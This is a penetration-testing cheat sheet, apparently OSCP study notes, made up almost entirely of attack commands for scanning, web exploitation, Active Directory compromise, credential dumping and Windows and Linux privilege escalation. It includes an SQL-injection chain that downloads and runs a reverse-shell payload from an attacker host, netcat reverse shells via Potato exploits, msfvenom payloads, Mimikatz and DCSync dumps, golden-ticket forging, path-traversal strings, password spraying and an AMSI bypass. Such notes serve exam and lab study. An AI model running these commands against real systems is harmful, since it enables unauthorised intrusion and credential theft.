# OSCP Notes

## Reconnaissance & Enumeration
### General & Port Scanning
```bash
#use -Pn option if you're getting nothing in the scan
sudo nmap -sC -sV <IP> -v #Basic scan
sudo nmap -T4 -A -p- <IP> -v #complete scan
sudo nmap -Pn -p- <IP>

#NSE
updatedb
locate .nse | grep <name>
sudo nmap --script="name" <IP>                                                                                                        #here we can specify other options like specific ports...etc
Test-NetConnection -Port <port> <IP>                                                                                                              #powershell utility
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("IP", $_)) "TCP port $_ is open"} 2>$null                                                                         #automating port scan of first 1024 ports in powershell
```
### SNMP
```bash
snmpbulkwalk -c public -v2c 192.168.204.149 . > snmp.txt
Strings snmp.txt                                                              to extract info like user and pass
```

## Reconnaissance - FTP
```bash
ftp <IP>

#login if you have relevant creds or based on nmap scan find out whether this has an anonymous login or not, then login with Anonymous:password
always try default creds anonymous:anonymous $ ftp:ftp

put <file> #uploading file
get <file> #downloading file

#NSE
locate .nse | grep ftp
nmap -p21 --script=<name> <IP>

#bruteforce
hydra -L users.txt -P passwords.txt <IP> ftp #'-L' for usernames list, '-l' for username and vice versa
```

## Reconnaissance - SSH
```bash
#Login
ssh uname@IP #enter the password in the prompt

#id_rsa or id_ecdsa file
chmod 600 id_rsa/id_ecdsa
ssh uname@IP -i id_rsa/id_ecdsa #if it still asks for the password, crack it using John

#cracking id_rsa or id_ecdsa
ssh2john id_ecdsa(or)id_rsa > hash
john --wordlist=/home/sathvik/Wordlists/rockyou.txt hash... #bruteforce
hydra -l uname -P passwords.txt <IP> ssh                                                                                                                              #'-L' for usernames list, '-l' for username and vice versa
```

## Reconnaissance - SMB
```bash
sudo nbtscan -r 192.168.50.0/24 #IP or range can be provided

#NSE scripts can be used
locate .nse | grep smb
nmap -p445 --script="name" $IP 

#In windows we can view like this
net view \\<computername/IP> /all

#crackmapexec
crackmapexec smb 192.168.1.100 -u username -p password --shares #lists available shares
crackmapexec smb 192.168.1.100 -u username -p password --users #lists users
crackmapexec smb 192.168.1.100 -u username -p password --all #all information
crackmapexec smb 192.168.1.100 -u username -p password -p 445 --shares #specific port
crackmapexec smb 192.168.1.100 -u username -p password -d mydomain --shares #specific domain
#Inplace of username and password, we can include usernames.txt and passwords.txt for password-spraying or bruteforcing.

# Smbclient
smbclient -L //IP #or try with 4 /'s
smbclient //server/share -U domain/username

#SMBmap
smbmap -H <target_ip>
smbmap -H <target_ip> -u <username> -p <password>
smbmap -H <target_ip> -u <username> -p <password> -d <domain>
smbmap -H <target_ip> -u <username> -p <password> -r <share_name>

#Within SMB session
put <file> #to upload file
get <file> #to download file
	• Downloading shares is made easy—if the folder consists of several files, they will all be downloaded by this.
mask ""
recurse ON
prompt OFF
mget *
```

## Reconnaissance - HTTP/S
	• View the source code and identify any hidden content. If an image looks suspicious, download it and try to find hidden data in it.
	• Identify the version or CMS and check for active exploits. This can be done using Nmap and Wappalyzer.
	• check /robots.txt folder
	• Look for the hostname and add the relevant one to /etc/hosts file.
	• Directory and file discovery - Obtain any hidden files that may contain juicy information
```bash
dirbuster
gobuster dir -u http://example.com   -w /path/to/wordlist.txt
python3 dirsearch.py -u http://example.com   -w /path/to/wordlist.txt
```
	• Vulnerability Scanning using nikto: nikto -h <url>
	• HTTPSSSL certificate inspection, may reveal information like subdomains, usernames…etc
	• Default credentials: Identify the CMS or service, check for default credentials, and test them out.
	• Bruteforce
```bash
hydra -L users.txt -P password.txt <IP or domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-post-form mode for https, post, or get, which can be obtained from Burpsuite. Also, capture the response for detailed information.
#Bruteforce can also be done by Burpsuite but it's slow, prefer Hydra!
```
	• if cgi-bin is present, then do further fuzzing and obtain files like .sh or .pl
	• Check if other services like FTP/SMB or any other that has upload privileges are getting reflected on the web.
	• API - Fuzz further, and it can reveal some sensitive information

## Web Enumeration - Tools
```bash
wapiti -u http://mailing.htb/

nikto -host $ip -o nikto.txt         #vul scanner

droopescan scan drupal http://$ip -t 32
 
WhatWeb http://usage.htb/
```

## Web Enumeration - CMS (WordPress)
```bash
wpscan --url http://192.168.128.239:80 -e t,u,vp  --random-user-agent --api-token Mfrefgghsjgs
wpscan --url http://$ip -e p,t,u --detection-mode aggressive > wpscan.log
wpscan --url http://192.168.128.239:80 -e u -P /usr/share/wordlists/rockyou.txt

# basic usage
wpscan --url "target" --verbose
# enumerate vulnerable plugins, users, vulnerable themes, timthumbs
wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log
```

## Web Enumeration - Misc
Curl
```bash
curl -F filename="/home/alfredo/.ssh/authorized_keys" -F file=@id_alfredo.pub http://192.168.56.101:33414/file-upload
```

Path traversal
```bash
../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd
….//….//….//….//….//….//….//….//….//….//….//….//….//….// ….//….//etc/passwd
/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
```

Git
```bash
# If .git found
git-dumper http://dev.linkvortex.htb/.git dump
	git status
	Git log
	Git diff 
	Git show
```
Git-Hack Tool 
https://github.com/WangYihang/GitHacker

SQL injection in login Form
```bash
admin'EXEC sp_configure 'xp_cmdshell',1; --
admin'EXEC sp_configure reconfigure; --
msfvenom -p windows/x64/shewindows/x64/shell_reverse_tcp ll_reverse_tcp lhost=192.168.45.181 lport=80 -f exe -o r80.exe
admin';EXEC xp_cmdshell 'certutil -urlcache -split  -f http://192.168.45.198:8002/r80.exe c:\windows\temp\r80.exe'; --
admin';EXEC xp_cmdshell 'c:\windows\temp\r80.exe'; --
```

## Fuzzing
### Subdomain
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://linkvortex.htb/ -H 'Host: FUZZ.linkvortex

ffuf -u http://10.10.11.18 -H "Host: FUZZ.usage.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac 

$ffuf -ac -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://board.htb -H "HOST: FUZZ.board.htb"               >>>>>>
```

### Directories
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://dev.linkvortex.htb/FUZZ

ffuf -ac -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt -u "http://cozyhostin.htb/FUZZ"

$ffuf -ac -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://10.10.10.171/FUZZ" -o ffuf.txt                   >>>>>>
```

### Feroxbuster
```bash
feroxbuster -u http://siteisup.htb -x php
```

### Gobuster
```bash
gobuster dir -u http://soccer.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

gobuster vhost -u "<host>" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain
```

## Active Directory - Enumeration
```bash
enum4linux -a 10.10.10.161
```

Netexec / Crackmapexec
```bash
netexec smb CICADA-DC -u guest -p '' --shares                                                                                                                             
netexec smb CICADA-DC -u guest -p '' --rid-brute                                                                                                                            #to brute force user ids from 0 to 4000
netexec smb CICADA-DC -u guest -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users.txt                                     #to cut users only
```

Password spray
```bash
netexec smb CICADA-DC -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-success         
```

To Validate Creds
```bash
netexec smb CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
netexec ldap CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
netexec winrm CICADA-DC -u david.orelious -p 'aRt$Lp#7t*VQ!3'
nxc rdp ip172.txt -u 'yoshi' -p 'Mushroom!'                                     
```

List Users
```bash
impacket-lookupsid 'cicada.htb/guest'@cicada.htb -no-pass | grep 'SidTypeUser' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt
lookupsid.py guest@10.10.11.35 -no-pass | grep 'SidTypeGroup' | sed 's/.*\\\(.*\) (SidTypeUser)/\1/' > users.txt  
GetADUsers.py egotistical-bank.local/ -dc-ip 10.10.10.175 -debug
impacket-GetADUsers -all domain/admin:password -dc-ip 10.10.x.45
python windapsearch.py -u "" --dc-ip 10.10.10.172 -U | grep '@' | cut -d ' ' -f 2 | cut -d '@' -f 1 | uniq > users 
```

Users & Groups
```bash
net user
net user /domain
net user $domain_user /domain
net group /domain
net localgroup administrators
```

## Active Directory - Sharphound
```bash
.\SharpHound.exe -c All
```

## Active Directory - Bloodhound
Collection methods - database
```bash
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<Domain>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' -c all --zip --dns-timeout 30
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -gc '<DOMAIN>' -ns '<RHOST>' -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
bloodhound-python -u '<USERNAME>' -p '<PASSWORD>' -d '<DOMAIN>' -dc '<RHOST>' -ns '<RHOST>' --dns-tcp -no-pass -c all --zip
```

If you got errors and data couldn’t be collected
Use both and upload both to bloodhound duplicates will be ignored
```bash
rusthound-ce -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -c All
bloodhound-ce-python -c all -d tombwatcher.htb -u henry -p 'H3nry_987TGV!' --zip -ns 10.10.11.72
```

## Active Directory - BloodyAD
1. Core Enumeration (most used & important first)
```bash
# Get all users of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type user    

# Get all computers of the domain
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get children 'DC=<DOMAIN>,DC=<DOMAIN>' --type computer 

# Get group members
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object Users --attr member

# Get AD DNS records
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get dnsDump     

# Get UserAccountControl flags for a user
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<USERNAME>' --attr userAccountControl       

# Get AD functional level (msDS-Behavior-Version)
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr msDS-Behavior-Version    

# Get minimum password length policy
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr minPwdLength      

# Read ms-DS-MachineAccountQuota (quota for adding computer objects)
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object 'DC=<DOMAIN>,DC=<DOMAIN>' --attr ms-DS-MachineAccountQuota 
```

2. Privilege Escalation & Credential Access
```bash
# Read LAPS password (ms-Mcs-AdmPwd)
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr ms-Mcs-AdmPwd

# Read GMSA account password (msDS-ManagedPassword)
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword

# Read GMSA account password using Kerberos (dc-ip + -k)
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k get object '<ACCOUNTNAME>$' --attr msDS-ManagedPassword 

# Enable DONT_REQ_PREAUTH for ASREPRoast (LDAP bind change)
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<USERNAME>' DONT_REQ_PREAUTH

# Enable DONT_REQ_PREAUTH for ASREPRoast using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add uac '<USERNAME>' -f DONT_REQ_PREAUTH 
```

3. Domain Management / Modification
```bash
# Add user to a group
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add groupMember '<GROUP>' '<USERNAME>'   

bloodyAD --host "10.10.11.41" -d "certified.htb" -u "judith.mader" -p "judith09" set owner management  judith.mader
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "<owned user>" -p "newP@ssword2022" set owner  <exploitable user>  <owned user>
bloodyAD --host "10.10.11.72" -d "tombwatcher.htb" -u "<owned user>" -p "newP@ssword2022" add genericAll <exploitable user>  <owned user>

# Add user to a group using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k add groupMember '<GROUP>' '<USERNAME>'   

# Set a password for a user (using Kerberos + dc-ip)
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set password '<USERNAME>' '<PASSWORD>' --kerberos --dc-ip <RHOST> 

# Enable machine account as trusted for delegation
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add uac '<MACHINE_ACCOUNT>$' -f TRUSTED_FOR_DELEGATION 

# Add a computer object on behalf of a user
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add computer '<USERNAME>' '<PASSWORD>'

# Grant genericAll permissions to a specific OU for a user
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add genericAll 'OU=<OU>,DC=<DOMAIN>,DC=<DOMAIN>' '<USERNAME>'

# Add a new DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> add dnsRecord <RECORD> <LHOST>

# Remove a DNS entry
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove dnsRecord <RECORD> <LHOST>  

# Enable (clear) ACCOUNTDISABLE for a user (i.e., enable account)
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> remove uac '<USERNAME>' ACCOUNTDISABLE 

# Enable (clear) ACCOUNTDISABLE for a user using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k remove uac '<USERNAME>' -f ACCOUNTDISABLE
```

4. SPN and Certificate Management
```bash
# Set a Service Principal Name (SPN) for a user/computer
bloodyAD --host <RHOST> -d <DOMAIN> -u <USERNAME> -p <PASSWORD> set object '<USERNAME>' servicePrincipalName

# Set a Service Principal Name (SPN) using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName  

# Set a Service Principal Name (SPN) using Kerberos with explicit value
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -k set object '<USERNAME>' servicePrincipalName -v 'cifs/<USERNAME>'

# Set altSecurityIdentities (certificate UPN/CN) for a user using Kerberos
bloodyAD --host <RHOST> --dc-ip <RHOST> -d <DOMAIN> -u <USERNAME> -k set object '<USERNAME>' altSecurityIdentities -v 'X509:<UPN=<USERNAME>@<DOMAIN>>/CN=<CN>' 
```

## Certificate Abuse - Certify
https://github.com/GhostPack/Certify  
```bash
Certify.exe find /vulnerable
Certify.exe find /vulnerable /currentuser
```

## Certificate Abuse - Certipy
https://github.com/ly4k/Certipy  
https://github.com/ly4k/BloodHound/  

Shadow credentials 
```bash
certipy-ad shadow auto -username judith.mader@certified.htb -password judith09 -account management_svc -target certified.htb -dc-ip 10.10.11.41
```

Search Vulnerabilty
```bash
certipy find -u ca_operator@certified.htb -hashes b4b86f45c6018f1b664f70805f45d8f2 -vulnerable -stdout

certipy-ad find -u '<USERNAME>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <RHOST>
certipy-ad find -u '<USERNAME>' -p '<PASSWORD>' -dc-ip <RHOST> -vulnerable -stdout
```

Update UPN for a user if it is vulnerable to esc9
```bash
certipy-ad account update -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator -dc-ip 10.10.11.41
```

Account Creation
```bash
certipy-ad account create -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -dns <RHOST> -user '<COMPUTERNAME>'
```

Authentication
```bash
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>'
```

LDAP-Shell
```bash
certipy-ad auth -u '<USERNAME>' -pfx <FILE>.pfx -dc-ip <RHOST> -domain '<DOMAIN>' -ldap-shell
# add_user <USERNAME>
# add_user_to_group <GROUP>
```

Certificate Forging
```bash
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -template '<TEMPLATE>' -save-old
```

Certificate Request 
Run the following command twice because of a current issue with certipy.
			before that user's UPN must be changed to the original one.
```bash
certipy-ad req -u ca_operator -hashes :b4b86f45c6018f1b664f70805f45d8f2 -ca certified-DC01-CA -template CertifiedAuthentication -dc-ip 10.10.11.41                                              

certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>'
certipy-ad req -ca '<CA>' -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -dc-ip <RHOST> -target '<FQDN>' -template '<TEMPLATE>' -upn '<USERNAME>@<DOMAIN>' -dns '<FQDN>' -debug
```

Revert Changes
```bash
certipy-ad template -username '<USERNAME>@<DOMAIN>' -password '<PASSWORD>' -template '<TEMPLATE>' -configuration <TEMPLATE>.json
```

## Active Directory - Attacks
### NTLM Relay
```bash
# 1 create file Greenwolf/ntlm_theft
# 2 impacket-ntlmrelayx -t 192.168.141.174 -smb2support
```

### Kerberoasting / ASREPRoast / DCSync
```bash
GetUserSPNs.py [domain]/[user]:[password/password hash]@[Target IP Address] -dc-ip <IP> -request  #Kerberoasting, and request option dumps TGS
GetNPUsers.py test.local/ -dc-ip <IP> -usersfile usernames.txt -format hashcat -outputfile hashes.txt #Asreproasting, need to provide usernames list

# DcSync Attack
Impacket-secretsdump Administrator:"Password"@<DC_IP_Address>
Impacket-secretsdump domain/Administrator:"Password"@<DC_IP_Address>
```

### Silver Tickets
Obtaining hash of an SPN user using Mimikatz 
```bash
privilege::debug 
sekurlsa::logonpasswords                                                                           #obtain NTLM hash of the SPN account here
```
abuse constrained delegation 
```bash
impacket-getST -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :c5f5537e080917d785293aeb90120854 -impersonate administrator intelligence.htb/svc_int
```

### Golden Tickets
```bash
impacket-ticketer -aesKey <aesKey_of_krbtgt_account> -domain <domain_name_of_child_domain> -domain-sid <child_domain_sid> -extra-sid <parent_domain_sid>-519 Administrator -extra-pac

# STEP 1: Get the Domain SID and NTLM hash of the krbtgt account
# <aesKey_of_krbtgt_account> :b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2
# <child_domain_sid> :  S-1-5-21-4168247447-1722543658-2110108262

# Execution 
impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 Administrator -extra-pac
export KRB5CCNAME=Administrator.ccache
impacket-psexec 'sub.domain.yzx/administrator@dc01.domain.yzx' -k -no-pass
```

Golden Ticket using Mimikatz
```bash
kerberos::golden /User:MyAdministrator /domain:marvel.local /sid:S-1-5-21-1796002695-2329991732-2223296958 /krbtgt:21a84dbb8f81aa02316606b488a4a9eb /id:500 /ptt
# id:500 - Administrator account
# ptt - pass the ticket into the session
```

### Misc Attacks
Dnstool.py (krbrelayx tool)
```bash
Python3 dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.16.6 -t A 
```
Abuse ReadGMSAPassword rights
```bash
python3 gMSADumper.py -u 'Ted.Graves' -p 'Mr.Teddy' -d 'intelligence.htb'
```

## Active Directory - Lateral Movement & Persistence
### Evil-WinRM
```bash
##Login with password
evil-winrm -i <IP> -u user -p pass
evil-winrm -i <IP> -u user -p pass -S #if 5986 port is open
##Login with Hash
evil-winrm -i <IP> -u user -H ntlmhash
##Login with key
evil-winrm -i <IP> -c certificate.pem -k priv-key.pem -S #-c for public key and -k for private key

# bypassing AMSI
Bypass-4MSI
Invoke-Mimikatz.ps1
```

### Lateral Movement - Impacket
```bash
psexec.py test.local/john:password123@10.10.10.1
psexec.py -hashes lmhash:nthash test.local/john@10.10.10.1
wmiexec.py test.local/john:password123@10.10.10.1
smbexec.py test.local/john:password123@10.10.10.1
atexec.py test.local/john:password123@10.10.10.1 <command>
```

### Password Changes
```bash
net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"Password" -S "DomainController"                                                                                                      U use password here
bloodyAD -d <DOMAIN> -u ' <USERNAME>' -p ':1c37d00093dc2a5f25176bf2d474afdc' --host  <DC01.DOMAIN> set password "<user to change his password>" "0xdf0xdf!"               U can use hash here w khod balk hena l hash et7at bl :
pth-net rpc password "TargetUser" "newP@ssword2022" -U "DOMAIN"/"ControlledUser"%"LMhash":"NThash" -S "DomainController"                                                                               U can use hash here
rpcclient -U 'USER%PASSWORD' 192.168.x.x
rpcclient $> setuserinfo USER 23 'password123' 
```

## Credential Attacks - Mimikatz
```bash
token::elevate
sekurlsa::logonpasswords #hashes and plaintext passwords
lsadump::sam SystemBkup.hiv SamBkup.hiv
lsadump::dcsync /user:krbtgt
lsadump::lsa /patch #both these dump SAM
lsadump::cache
lsadump::secrets

#OneLiner
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"   
mimikatz.exe "lsadump::zerologon /target:192.168.217.97 /account:DC01$"
mimikatz.exe "lsadump::dcsync /domain:secura.yzx /dc:dc01 /user:administrator /authuser:DC01$ /authdomain:main /authpassword:"" /authntlm"
```

## Credential Attacks - Tools
Hash Analyzer: https://www.tunnelsup.com/hash-analyzer/  

fcrackzip
```bash
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt <FILE>.zip                                                                                                                            #Cracking zip files
```

John
```bash
#Convert the obtained hash to John format(above link)
john hashfile --wordlist=rockyou.txt
```

## Linux Privilege Escalation - Detailed
### TTY Shell & Basic Checks
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo 'os.system('/bin/bash')'
/bin/sh -i
/bin/bash -i
perl -e 'exec "/bin/sh";'

find / -writable -type d 2>/dev/null
dpkg -l                                                                                                                                       #Installed applications on Debian system
cat /etc/fstab                                                                                                                               #Listing mounted drives
lsblk                                                                                                                                    #Listing all available drives
lsmod                                                                                                                                 #Listing loaded drivers
watch -n 1 "ps -aux | grep pass"                                                                                  #Checking processes for credentials
sudo tcpdump -i lo -A | grep "pass"                                                                              #Password sniffing using tcpdump
```

### Automated Scripts
```bash
linPEAS.sh
LinEnum.sh
linuxprivchecker.py
unix-privesc-check
Mestaploit: multi/recon/local_exploit_suggester
```

### Sensitive Information
```bash
cat .bashrc
env                                                                                                                                                           #checking environment variables
watch -n 1 "ps -aux | grep pass"                                                                                                   #Harvesting active processes for credentials
# Process-related information can also be obtained from PSPY
```

### Sudo/SUID/Capabilities/Cron/NFS
```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null

# Cron Jobs
cat /etc/crontab
crontab -l
pspy                                                                                                                   #handy tool to live monitor stuff happening in Linux
grep "CRON" /var/log/syslog                                                                             #inspecting cron logs

# NFS
cat /etc/exports #On target
showmount -e <target IP> #On attacker
###Check for "no_root_squash" in the output of shares
mount -o rw <targetIP>:<share-location> <directory path we created>
#Now create a binary there
chmod +x <binary>
```

## Windows Privilege Escalation - Detailed
### Manual Enumeration
```bash
#Groups we're part of
whoami /groups
whoami /all #lists everything we own.

#Starting, Restarting and Stopping services in Powershell
Start-Service <service>
Stop-Service <service>
Restart-Service <service>

#Powershell History
Get-History
(Get-PSReadlineOption).HistorySavePath #displays the path of consoleHost_history.txt
type C:\Users\sathvik\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

#Viewing installed execuatbles
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

#Process Information
Get-Process
Get-Process | Select ProcessName,Path

#Sensitive info in XAMPP Directory
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue #this for a specific user

#Service Information
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

### Automated Scripts
```bash
winpeas.exe
winpeas.bat
Jaws-enum.ps1
powerup.ps1
PrivescCheck.ps1
```

### Token Impersonation (Potatoes)
```bash
#Printspoofer
PrintSpoofer.exe -i -c powershell.exe 
PrintSpoofer.exe -c "nc.exe <lhost> <lport> -e cmd"

#RoguePotato
RoguePotato.exe -r <AttackerIP> -e "shell.exe" -l 9999

#GodPotato
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "shell.exe"

#JuicyPotatoNG
JuicyPotatoNG.exe -t * -p "shell.exe" -a

#SharpEfsPotato
.\SharpEfsPotato.exe -p C:\users\adrian\documents\nc.exe -a "192.168.45.188 4455 -e cmd.exe"
.\SharpEfsPotato.exe -p C:\temp\nc.exe -a "192.168.45.188 1234 -e cmd.exe"
#writes whoami command to w.log file
```

### Services & Hijacking
```bash
#Identify service from winpeas
icalcs "path" #F means full permission, we need to check we have full access on the folder
sc qc <servicename> #find binary path variable
sc config <service> <option>="<value>" #change the path to the reverse shell location
sc start <servicename>

#Unquoted Service Path
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
#Check the Writable path
icalcs "path"

#Insecure Service Executables
#In Winpeas look for a service which has the following
File Permissions: Everyone [AllAccess]
#Replace the executable in the service folder and start the service
sc start <service>

#Weak Registry permissions
#Look for the following in Winpeas services info output
HKLM\system\currentcontrolset\services\<service> (Interactive [FullControl]) #This means we have full access
accesschk /acceptula -uvwqk <path of registry> #Check for KEY_ALL_ACCESS
#Service Information from regedit, identify the variable that holds the executable
reg query <reg-path>
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
#Imagepath is the variable here
net start <service>

#DLL Hijacking
# 1. Find Missing DLLs using Process Monitor, Identify a specific service that looks suspicious, and add a filter.
# 2. Check whether you have write permissions in the directory associated with the service.
# Create a reverse-shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attaker-IP> LPORT=<listening-port> -f dll > filename.dll
# 3. Copy it to the victim machine and then move it to the service-associated directory.(Make sure the dll name is similar to the missing name)
# 4. Start the listener and restart the service; you'll get a shell.
```

### Autorun / Installers / Tasks
```bash
#Autorun
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
#Check the location is writable
accesschk.exe \accepteula -wvu "<path>" #returns FILE_ALL_ACCESS

#AlwaysInstallElevated
#For checking, it should return 1 or Ox1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
#Creating a reverseshell in msi format
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<port> --platform windows -f msi > reverse.msi
#Execute and get shell
msiexec /quiet /qn /i reverse.msi

#Schedules Tasks
schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one

#Startup Apps
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp #Startup applications can be found here
```

### Sensitive Files & Registry
```bash
#SAM and SYSTEM
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
C:\windows.old
impacket-secretsdump -system SYSTEM -sam SAM local #always mention local in the command

#Sensitive files
findstr /si password *.txt  
findstr /si password *.xml  
findstr /si password *.ini  
Findstr /si password *.config 
findstr /si pass/pwd *.ini  
dir /s *pass* == *cred* == *vnc* == *.config*  
findstr /spin "password" *.*  

#Config files
c:\sysprep.inf  
c:\sysprep\sysprep.xml  
c:\unattend.xml  
%WINDIR%\Panther\Unattend\Unattended.xml  
%WINDIR%\Panther\Unattended.xml  
dir /b /s unattend.xml  
dir /b /s web.config  
dir /b /s sysprep.inf  
dir /b /s sysprep.xml  
dir /b /s *pass*  
dir c:\*vnc.ini /s /b  
dir c:\*ultravnc.ini /s /b   
dir c:\ /s /b | findstr /si *vnc.ini

#Registry
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
